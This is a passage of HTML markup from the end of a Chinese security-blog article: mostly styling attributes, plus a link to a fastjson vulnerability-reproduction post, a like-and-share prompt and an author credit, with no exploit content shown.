style="white-space: normal;background-color: rgb(255, 255, 255);font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;text-align: center;color: rgb(163, 163, 163) !important;"><br  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="background-color: rgb(255, 255, 255); font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__348" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" data-darkmode-bgcolor-16267000829072="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16267000829072="#fff|rgb(255, 255, 255)" data-darkmode-color-16267000829072="rgb(163, 163, 163)" data-darkmode-original-color-16267000829072="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16273134728506="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16273134728506="#fff|rgb(255, 255, 255)" data-darkmode-color-16273134728506="rgb(163, 163, 163)" data-darkmode-original-color-16273134728506="#fff|rgb(163, 163, 163)" style="white-space: normal;background-color: rgb(255, 255, 255);font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;text-align: center;color: rgb(163, 163, 163) !important;"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247499667&amp;idx=1&amp;sn=21f18b37fdb83c161043d6cfa80d427f&amp;chksm=ec1caaacdb6b23bae15f4e09f73072ca24b406222049e6e53be6d1def28270206f71747e7b66&amp;scene=21#wechat_redirect" data-itemshowtype="0" tab="innerlink" data-linktype="2"><strong>干货｜最全fastjson漏洞复现与绕过</strong></a><br  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="background-color: rgb(255, 255, 255); font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__349" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" data-darkmode-bgcolor-16267000829072="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16267000829072="#fff|rgb(255, 255, 255)" data-darkmode-color-16267000829072="rgb(163, 163, 163)" data-darkmode-original-color-16267000829072="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16273134728506="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16273134728506="#fff|rgb(255, 255, 255)" data-darkmode-color-16273134728506="rgb(163, 163, 163)" data-darkmode-original-color-16273134728506="#fff|rgb(163, 163, 163)" style="white-space: normal;background-color: rgb(255, 255, 255);font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;text-align: center;color: rgb(163, 163, 163) !important;"><br  /></p><p data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-style="background-color: rgb(255, 255, 255); font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__362" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" data-darkmode-bgcolor-16267000829072="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16267000829072="#fff|rgb(255, 255, 255)" data-darkmode-color-16267000829072="rgb(163, 163, 163)" data-darkmode-original-color-16267000829072="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16273134728506="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16273134728506="#fff|rgb(255, 255, 255)" data-darkmode-color-16273134728506="rgb(163, 163, 163)" data-darkmode-original-color-16273134728506="#fff|rgb(163, 163, 163)" style="white-space: normal;background-color: rgb(255, 255, 255);font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;text-align: center;color: rgb(163, 163, 163) !important;"><span data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" data-darkmode-color-16198392309037="rgb(255, 104, 39)" data-darkmode-original-color-16198392309037="#fff|rgb(255, 104, 39)" data-darkmode-bgcolor-16267000829072="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16267000829072="#fff|rgb(255, 255, 255)" data-darkmode-color-16267000829072="rgb(255, 104, 39)" data-darkmode-original-color-16267000829072="#fff|rgb(163, 163, 163)|rgb(255, 104, 39)" data-darkmode-bgcolor-16273134728506="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16273134728506="#fff|rgb(255, 255, 255)" data-darkmode-color-16273134728506="rgb(255, 104, 39)" data-darkmode-original-color-16273134728506="#fff|rgb(163, 163, 163)|rgb(255, 104, 39)" style="font-size:18px;line-height:38px;;color: rgb(255, 104, 39);"><strong data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" data-darkmode-color-16198392309037="rgb(255, 104, 39)" data-darkmode-original-color-16198392309037="#fff|rgb(255, 104, 39)" data-darkmode-bgcolor-16267000829072="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16267000829072="#fff|rgb(255, 255, 255)" data-darkmode-color-16267000829072="rgb(255, 104, 39)" data-darkmode-original-color-16267000829072="#fff|rgb(163, 163, 163)|rgb(255, 104, 39)" data-darkmode-bgcolor-16273134728506="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16273134728506="#fff|rgb(255, 255, 255)" data-darkmode-color-16273134728506="rgb(255, 104, 39)" data-darkmode-original-color-16273134728506="#fff|rgb(163, 163, 163)|rgb(255, 104, 39)">点赞，转发，在看</strong></span></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="background-color: rgb(255, 255, 255); font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; text-align: right; color: rgb(163, 163, 163) !important;" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" class="js_darkmode__363" data-darkmode-bgcolor-16267000829072="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16267000829072="#fff|rgb(255, 255, 255)" data-darkmode-color-16267000829072="rgb(163, 163, 163)" data-darkmode-original-color-16267000829072="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16273134728506="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16273134728506="#fff|rgb(255, 255, 255)" data-darkmode-color-16273134728506="rgb(163, 163, 163)" data-darkmode-original-color-16273134728506="#fff|rgb(163, 163, 163)" style="white-space: normal;background-color: rgb(255, 255, 255);font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;text-align: right;color: rgb(163, 163, 163) !important;"><br data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" data-darkmode-bgcolor-16267000829072="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16267000829072="#fff|rgb(255, 255, 255)" data-darkmode-color-16267000829072="rgb(163, 163, 163)" data-darkmode-original-color-16267000829072="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16273134728506="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16273134728506="#fff|rgb(255, 255, 255)" data-darkmode-color-16273134728506="rgb(163, 163, 163)" data-darkmode-original-color-16273134728506="#fff|rgb(163, 163, 163)"  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="background-color: rgb(255, 255, 255); font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; text-align: right; color: rgb(163, 163, 163) !important;" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" class="js_darkmode__364" data-darkmode-bgcolor-16267000829072="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16267000829072="#fff|rgb(255, 255, 255)" data-darkmode-color-16267000829072="rgb(163, 163, 163)" data-darkmode-original-color-16267000829072="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16273134728506="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16273134728506="#fff|rgb(255, 255, 255)" data-darkmode-color-16273134728506="rgb(163, 163, 163)" data-darkmode-original-color-16273134728506="#fff|rgb(163, 163, 163)" style="white-space: normal;background-color: rgb(255, 255, 255);font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;text-align: right;color: rgb(163, 163, 163) !important;"><span data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" data-darkmode-bgcolor-16267000829072="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16267000829072="#fff|rgb(255, 255, 255)" data-darkmode-color-16267000829072="rgb(163, 163, 163)" data-darkmode-original-color-16267000829072="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16273134728506="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16273134728506="#fff|rgb(255, 255, 255)" data-darkmode-color-16273134728506="rgb(163, 163, 163)" data-darkmode-original-color-16273134728506="#fff|rgb(163, 163, 163)" style="font-size:12px;line-height:32px;;">原创投稿作者：mathwizard</span></p><p style="white-space: normal;text-align: center;"><img class="rich_pages wxw-img" data-galleryid="" data-ratio="0.5197505197505198" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/79_EedaMZeibI6cKE55jiaLMf9APuY0pA.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif'" data-type="gif" data-w="962"  /></p><p><br  /></p>
                </div>
</div>
</body>
</html>